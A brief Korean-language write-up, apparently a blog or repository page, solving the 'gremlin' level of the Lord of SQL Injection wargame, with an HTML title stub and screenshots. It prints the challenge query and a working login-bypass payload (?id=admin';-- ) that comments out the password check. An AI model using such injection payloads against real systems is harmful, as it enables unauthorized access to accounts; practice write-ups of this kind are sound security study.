<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Lord of SQL Injection gremlin Write-Up</h1>
</body>
<br>
<br>
</html>

문제 서버로 들어가보자
![image](https://github.com/user-attachments/assets/a3f5e1d2-c0c9-47d8-8cdc-159bf96f3438)

쿼리문과 php문을 살펴보면 admin으로 로그인 하면 문제를 해결 할 수 있을것 같다.

```python
select id from prob_gremlin where id='' and pw=''
```

url칸에 ```?```사용해서 admin으로 로그인 해보자
```python
?id=admin';-- pw='123'
```
id는 admin으로 설정하고 그 뒤를 추석처리한후 pw는 아무거나 입력해 주었다.
![image](https://github.com/user-attachments/assets/373f5bbe-84a5-4e17-a52f-6828cce908ea)

Clear했다!!
